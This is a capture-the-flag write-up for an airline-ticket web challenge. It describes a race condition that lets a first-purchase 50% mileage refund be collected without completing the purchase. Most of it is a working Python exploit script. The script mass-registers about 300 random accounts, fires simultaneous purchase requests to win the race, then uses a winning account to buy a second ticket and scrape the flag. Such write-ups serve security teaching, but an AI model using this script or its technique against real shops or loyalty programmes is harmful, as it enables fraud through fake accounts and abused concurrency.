# Exploit

## Description

The goal of this challenge to achieve a race condition. Indeed, the
application allows you to buy flight tickets, if you have never bought a
ticket you have the right to discounted tickets where 50% of the price will be
refunded.  
The race condition is during the ticket purchase process.

## Exploitation Method

In order to win the race condition, it is necessary to buy at the same time
the promotional ticket that interests us (here the one to go to Dubai because
50% of its price + our 1000 miles will allow us to buy the ticket for Las
Vegas).  
So we have to create a large number of users (more than the number of tickets
available) then launch a purchase request at the same time, some of the users
will enter in the purchase process, receive the promotion but can not buy a
ticket because there will be no more tickets available.  
Users who have won the race will have a balance of 1450 miles and can buy the
ticket for Las Vegas.

## Exploitation script

```  
# coding: utf-8

from threading import Thread  
import requests  
import string  
from random import *  
import sys  
import re  
import time

allchar = string.ascii_letters + string.digits

class monThread(Thread):

   ###  
   ### Initiation d'un thread avec création d'un utilisateur unique puis
connexion pour obtenir un cookie valide  
   ###  
   def __init__(self, ip, port):  
       Thread.__init__(self)  
       self.username ="".join(choice(allchar) for x in range(randint(8, 12)))  
       self.password = "".join(choice(allchar) for x in range(randint(8, 12)))  
       self.target_url = "http://" + ip + ":"  + str(port) + "/"  
       r1 = requests.post(self.target_url + "register.php", data = {"rUsername":self.username, "rPassword":self.password, "rPassword2":self.password})  
       r2 = requests.get(self.target_url)  
       rCookie = requests.utils.dict_from_cookiejar(r2.cookies)  
       self.cookie = rCookie.get(rCookie.keys()[0])  
       r3 = requests.post(self.target_url + "login.php", data = {"username":self.username, "password":self.password}, cookies = {"PHPSESSID":self.cookie})

   ###  
   ### On achète le billet 12 (car en promo à 900 donc +450 miles si race
condition ok)  
   ###  
   def run(self):  
       r4 = requests.post(self.target_url + "myairline/buy_ticket.php", cookies = {"PHPSESSID":self.cookie}, data = {"idFlightPost":12})

   def getMilesIfCanFlag(self):  
       r5 = requests.get(self.target_url + "myairline/", cookies = {"PHPSESSID":self.cookie})  
       regex = r".*Balance : (.*) Miles"  
       strPage = r5.text  
       match = re.search(regex, strPage)  
       self.miles_account = match.group(1)

       if(int(self.miles_account) > 1400):  
           return 1  
       return 0

   def getFlag(self):  
       r7 = requests.post(self.target_url + "myairline/buy_ticket.php", cookies = {"PHPSESSID":self.cookie}, data = {"idFlightPost":7})  
       r6 = requests.get(self.target_url + "myairline/mytickets.php", cookies = {"PHPSESSID":self.cookie})  
       regex = r".*NDH{(.*)}"

       strPage = r6.text  
       match = re.search(regex, strPage)

       return match.group(1)

   def getUsername(self):  
       return self.username

   def getPassword(self):  
       return self.password

def progress(count, total, status=''):  
   bar_len = 60  
   filled_len = int(round(bar_len * count / float(total)))

   percents = round(100.0 * count / float(total), 1)  
   bar = '=' * filled_len + '-' * (bar_len - filled_len)

   sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))  
   sys.stdout.flush()

def main(ip, port):  
   listThread = []  
   nThreads = 300  
   print "\n"  
   print "###########################"  
   print "User creation in process..."

   for i in range(1, nThreads):  
       thread = monThread(ip, port)  
       listThread.append(thread)  
       progress(i+1, nThreads)

   print ""  
   print "Done !"  
   print "###########################"  
   print ""  
   print "###########################"  
   print "All threads are trying to buy the discounted ticket for Dubai worth
900 miles \nin order to cause a race condition and get the promotion (450
miles) without buying the ticket..."  
   for i in range(0, nThreads-1):  
       listThread[i].start()

   j = 0  
   flag = ""  
   username = ""  
   password = ""  
   cptWinner = 0  
   for i in range(0, nThreads-1):  
       if(listThread[i].getMilesIfCanFlag()):  
           if(j == 0):  
               flag = listThread[i].getFlag()  
               username = listThread[i].getUsername()  
               password = listThread[i].getPassword()  
           j += 1  
           cptWinner += 1

       listThread[i].join()

   print ""  
   print str(cptWinner) + " account(s) won the race!"  
   print ""

   if flag != "":  
       print "Using the first one to get the flag..."  
       print "Username : " + username  
       print "Password : " + password  
       print "Flag is : NDH{" + flag + "}"  
   else:  
       print "Cannot get the flag :("

   print "###########################"

if __name__ == '__main__':  
   print "______                ___              _           _ _____ _
___  ___           _     _            "  
   print "| ___ \              / _ \            (_)         | |_   _| |        |  \/  |          | |   (_)           "  
   print "| |_/ /__ _  ___ ___/ /_\ \ __ _  __ _ _ _ __  ___| |_| | | |__   ___| .  . | __ _  ___| |__  _ _ __   ___ "  
   print "|    // _` |/ __/ _ \  _  |/ _` |/ _` | | '_ \/ __| __| | | '_ \ / _ \ |\/| |/ _` |/ __| '_ \| | '_ \ / _ \\"  
   print "| |\ \ (_| | (_|  __/ | | | (_| | (_| | | | | \__ \ |_| | | | | |  __/ |  | | (_| | (__| | | | | | | |  __/"  
   print "\_| \_\__,_|\___\___\_| |_/\__, |\__,_|_|_| |_|___/\__\_/ |_|
|_|\___\_|  |_/\__,_|\___|_| |_|_|_| |_|\___|"  
   print "                            __/ |                                                                          "  
   print "                           |___/
"

   if(len(sys.argv) >= 2 ):  
       main(sys.argv[1], sys.argv[2])  
   else:  
       print ''  
       print 'Usage: exploit.py IP PORT'

```